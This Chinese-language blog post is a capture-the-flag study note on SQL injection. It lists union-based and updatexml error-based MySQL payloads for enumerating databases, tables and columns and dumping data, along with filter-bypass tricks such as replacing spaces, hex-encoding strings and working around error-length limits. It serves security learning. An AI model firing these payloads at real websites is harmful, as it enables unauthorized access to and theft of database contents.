---
title: CTF SQLI
toc: true
date: 2021-04-25 17:12:07
tags: CTF
categories: [100 Cyber security, 120 CTF, 121 Web ]
---

### 手注流程
1. 页面里有一个POST表单，测试会不会有注入漏洞
    POST里
    id=1'和id=1'#
    id=1' and 1=2#和id=1' and 1=1#
    前一个不回显后一个回显，那么说明存在注入。
1. 判断字段数：有四个字段
    id=1' order by 4#
1. 判断回显位：
    id=1' union select 1,2,3,4# 有正常回显
    id=1' union select 1,2,3# 无回显，证明该数据库在第四位，查询该数据库名

1. id=0' union select 1,2,3,database()# 查到表名为skctf，继续查数据表（tables）名
1. id=0' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema='skctf'#
1. id=0' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='fl4g'#
1. 查询数据：
    id=0' union select 1,2,3,skctf_flag from fl4g#
    得到flag。

### 手注变种：报错注入
https://www.cnblogs.com/c1047509362/p/12806297.html
1. `1'or(updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1))='1` 爆出数据库
1. `1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))，0x7e),1))='1` 爆当前数据库表信息
1. `1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema=wp_links)and(table_name='users')),0x7e),1))='1` 爆user表字段信息
1. `1' and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users)),1) #` 爆数据库内容
ref：https://www.codenong.com/cs106450896/

#### 报错注入变种：无单引号版
1. `aid=(select%201%20and%201=updatexml(1,concat(0x7e,(select(user())),0x7e),1))&target=1`


### 注入各种问题处理方法
1. 提示输出信息超过一行：使用group_concat,eg:3'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema='test')),0x7e),1))='1
字符串超过group_concat限制，使用limit 0,1单独输出，limit 0,1 表示输出第一个数据。 0表示输出的起始位置，1表示跨度为1（即输出几个数据，1表示输出一个，2就表示输出两个）。
ref：https://blog.csdn.net/forwardss/article/details/104682924
1. 替代空格：
    * 使用括号，eg：`3'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema='test')),0x7e),1))='1`
    * 使用内联注释：`/**/`
1. 报错注入，返回值XPATH syntax error有长度限制，为32bytes。使用substr截取需要的部分回显`updatexml(1,concat(0x7e,substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,32),0x7e),1)`
1. substr不能用：利用not in。`(select%201%20and%201=updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where table_schema=database() and table_name not in(0x6e657773)),0x7e),1))&target=1`，注意not in里面必须有内容，然后一点点添加不需要的表名，筛选出需要的表名。
1. 单引号被转义为\：用0x5C替代单引号
ref：https://www.cnblogs.com/lwfiwo/p/11314408.html
1. 引号绕过导致table_name='user'不能用：user转换成十六进制编码0x7573657273
    ref：https://blog.csdn.net/weixin_39846361/article/details/113301753

### 其它资源
1. sqlmap源码payload构成：https://www.anquanke.com/post/id/188173#h2-3
1. https://cloud.tencent.com/developer/article/1669841
1. https://www.yuque.com/vipkylin/vunko7/svhwwn
